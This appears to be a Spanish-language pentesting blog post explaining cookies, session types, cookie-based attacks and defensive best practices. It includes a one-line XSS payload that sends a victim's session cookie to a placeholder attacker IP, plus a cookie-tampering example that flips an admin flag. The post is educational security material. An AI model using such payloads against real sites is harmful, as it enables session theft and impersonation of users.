
---
title: "Cookies y Sesiones: El rastro dulce (y peligroso) del navegador"
author: "l1ttl3bugc4t"
date: "2025-05-12"
tags: [Cookies, Sesiones, Seguridad Web, Pentesting, Red Team]
categories: [Cuaderno, Red Team & Chill, CyberChallenges]
---

Las **cookies** no solo son dulces digitales 🍪, también son una de las piezas clave para mantener sesiones, rastrear usuarios y… **atacar apps web** 😼🔥

---

## 🧠 ¿Qué es una Cookie?

Una **cookie** es un pequeño archivo que un servidor web guarda en tu navegador.  
Puede contener:
- ID de sesión
- Preferencias del usuario
- Tokens de autenticación
- Información de seguimiento (¡hola, trackers!)

---

## 📦 Tipos de Cookies

| Tipo | Descripción |
|------|-------------|
| **De sesión** | Se eliminan al cerrar el navegador |
| **Persistentes** | Tienen fecha de expiración definida |
| **HttpOnly** | No pueden ser accedidas por JavaScript |
| **Secure** | Solo se transmiten por HTTPS |
| **SameSite** | Protegen contra CSRF limitando el envío de cookies entre sitios |

---

## 🔐 ¿Qué es una sesión?

Una **sesión** es el estado temporal que mantiene el servidor sobre un usuario autenticado.  
Generalmente se identifica mediante un **cookie de sesión**, como:

```
sessionid=QwErTy1234567890
```

---

## 🧪 ¿Qué puedes hacer con cookies en un pentest?

### 1. **Robo de sesión (Session Hijacking)**

Si capturas la cookie de sesión puedes suplantar al usuario.  
Ej: a través de un XSS que haga:

```javascript
document.location='http://tu-ip?cookie='+document.cookie;
```

---

### 2. **Fuerza bruta de cookies**

Algunos sitios generan cookies con patrones predecibles o codificados en base64.  
Puedes decodificar y manipular valores como:

```
admin=false → admin=true
```

---

### 3. **Cookie tampering / manipulación**

Cookies mal protegidas pueden permitir elevar privilegios, cambiar idiomas o inyectar SQL en endpoints mal filtrados.

---

### 4. **Análisis de atributos inseguros**

Busca cookies **sin HttpOnly** o **sin Secure** transmitidas por HTTP:  
¡son carne de cañón para sniffing con Wireshark o mitmproxy!

---

## 🛠️ Herramientas útiles

- 🧪 `Burp Suite` → Para ver, editar y repetir peticiones con cookies
- 🐍 `Python` con `requests` → Para automatizar tests de sesión
- 🔎 `Wireshark` → Para capturar cookies en tráfico sin cifrar
- 🔐 `cookie-parser` (Node.js) → Si estás auditando código backend

---

## 🔐 Buenas prácticas (para defender)

- Usa `Secure` y `HttpOnly`
- Implementa `SameSite=Strict` si no hay login entre sitios
- Expira la cookie al cerrar sesión
- Regenera el ID de sesión tras iniciar sesión
- No almacenes datos sensibles directamente en cookies

---

## 🚀 Conclusión

Las cookies no son peligrosas en sí mismas, pero mal usadas pueden ser el **punto de entrada perfecto** para un atacante astuto.  
Como l1ttl3bugc4t… ¡siempre observa los snacks que te deja el servidor! 🍪👁️‍🗨️

> ✨ _"Una sesión es confianza temporal. Una cookie mal hecha... es traición."_ — **l1ttl3bugc4t**

---
